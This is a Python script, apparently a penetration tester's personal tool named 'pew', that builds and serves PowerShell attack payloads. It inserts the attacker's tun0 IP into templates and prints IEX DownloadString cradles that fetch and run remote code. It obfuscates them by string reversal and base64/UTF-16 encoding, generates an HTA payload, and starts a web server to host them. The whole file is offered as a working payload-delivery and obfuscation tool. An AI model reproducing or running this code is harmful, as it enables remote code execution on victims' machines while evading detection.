import re
import subprocess
import sys
import base64
import os
import threading
import socket

YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET_COLOR = "\033[0m"
RED = "\033[91m"
ENDC = "\033[0m"

def get_tun0_ip():
    result = subprocess.run(['ifconfig', 'tun0'], capture_output=True, text=True)
    match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
    return match.group(1) if match else None

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def start_web_server(directory, port=80):
    if is_port_in_use(port):
        print(f"{RED}There is already a web server running on port {port}.{ENDC}")
        return

    try:
        subprocess.run(['sudo', 'python3', '-m', 'http.server', str(port)], cwd=directory, check=True)
    except KeyboardInterrupt:
        print("\nWeb server stopped.")
    except Exception as e:
        print(f"Error running web server: {e}")

def update_and_create_command(template_path, output_path, ip_address, port, additional_operation=None):
    with open(template_path, 'r') as template_file:
        template_content = template_file.read()

    template_content = re.sub(r'<IPADDRESS>', ip_address, template_content)
    template_content = re.sub(r'<PORT>', str(port), template_content)

    num_args = len(sys.argv) - 1

    default_port = 80

    ip_address = get_tun0_ip()
    port = default_port

    if num_args == 1:
        ip_address = sys.argv[1]
    elif num_args == 2:
        ip_address = sys.argv[1]
        port = int(sys.argv[2])
    elif num_args > 2:
        print("Usage: pew [IP_ADDRESS] [PORT]")
        sys.exit(1)

    with open(output_path, 'w') as output_file:
        output_file.write(template_content)

    powershell_command = f'IEX (New-Object Net.WebClient).DownloadString("http://{ip_address}:{port}/{os.path.basename(output_path)}")'

    if additional_operation:
        powershell_command += f'; {additional_operation}'

    return create_reverse_and_invoke_command(powershell_command)

def create_reverse_and_invoke_command(powershell_command):
    reversed_command = powershell_command[::-1]
    return f'\'{reversed_command}\' | ForEach-Object {{$reversed = $_.ToCharArray();[array]::Reverse($reversed);-join $reversed}} | IEX'

def encode_powershell_command(command):
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    return f'IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded_command}")))'

def encode_powershell_command_utf16(command):
    encoded_command = base64.b64encode(command.encode('utf-16le')).decode('utf-8')
    return f'powershell -enc {encoded_command}'

def run_es_template_script(original_directory):
    num_args = len(sys.argv) - 1

    default_port = 80

    ip_address = get_tun0_ip()
    port = default_port

    if num_args == 1:
        ip_address = sys.argv[1]
    elif num_args == 2:
        ip_address = sys.argv[1]
        port = int(sys.argv[2])
    try:
        home_dir = os.path.expanduser("~")
        os.chdir(f"{home_dir}/.local/bin/websrv")
        script_path = f"{home_dir}/.local/bin/pew/run-es-template/run-es.py"
        subprocess.run(['python3', script_path, ip_address, str(port)])

    except Exception as e:
        print(f"Error running es-template script: {e}")

    finally:
        os.chdir(original_directory)

def generate_hta_file(template_path, output_path, ip_address, port):
    with open(template_path, 'r') as template_file:
        template_content = template_file.read()

    replaced_content = template_content.replace('<LHOST>', f'{ip_address}:{port}')

    with open(output_path, 'w') as output_file:
        output_file.write(replaced_content)

    print(f"certutil -encode .\es.exe enc.txt")

def main():
    home_dir = os.path.expanduser("~")
    es_template_path = f"{home_dir}/.local/bin/websrv/es_template.ps1"
    es_output_path = f"{home_dir}/.local/bin/websrv/es.txt"
    enum_template_path = f"{home_dir}/.local/bin/websrv/enum_template.ps1"
    enum_output_path = f"{home_dir}/.local/bin/websrv/enum.txt"
    hta_template_path = f"{home_dir}/.local/bin/pew/run-es-template/es-template.hta"
    hta_output_path = f"{home_dir}/.local/bin/websrv/es.hta"
    num_args = len(sys.argv) - 1
    default_port = 80
    ip_address = get_tun0_ip()
    port = default_port
    if num_args == 1:
        ip_address = sys.argv[1]
    elif num_args == 2:
        ip_address = sys.argv[1]
        port = int(sys.argv[2])
    elif num_args > 2:
        print("Usage: pew [IP_ADDRESS] [PORT]")
        sys.exit(1)
    original_directory = os.getcwd()
    es_thread = threading.Thread(target=run_es_template_script, args=(original_directory,))
    es_thread.start()
    reversed_and_invoked_command_es = update_and_create_command(
        es_template_path, es_output_path, ip_address, port
    )
    reversed_and_invoked_command_enum = update_and_create_command(
        enum_template_path, enum_output_path, ip_address, port
    )

    generate_hta_file(hta_template_path, hta_output_path, ip_address, port)

    new_command = f'IEX (New-Object Net.WebClient).DownloadString("http://{ip_address}/enum.txt")'
    if port != default_port:
        new_command = f'IEX (New-Object Net.WebClient).DownloadString("http://{ip_address}:{port}/enum.txt")'
    print(f'IEX: \033[90m{new_command}\033[0m')

    print(f'Reversed: {YELLOW}{reversed_and_invoked_command_es}{RESET_COLOR}')
    encoded_command_es = encode_powershell_command(reversed_and_invoked_command_es)
    print(f'UTF8: {BLUE}{encoded_command_es}{RESET_COLOR}')

    encoded_command_es_utf16 = encode_powershell_command_utf16(reversed_and_invoked_command_es)
    print(f'UTF16: \033[92m{encoded_command_es_utf16}\033[0m')

    start_web_server(f"{home_dir}/.local/bin/websrv", port)

if __name__ == "__main__":
    main()
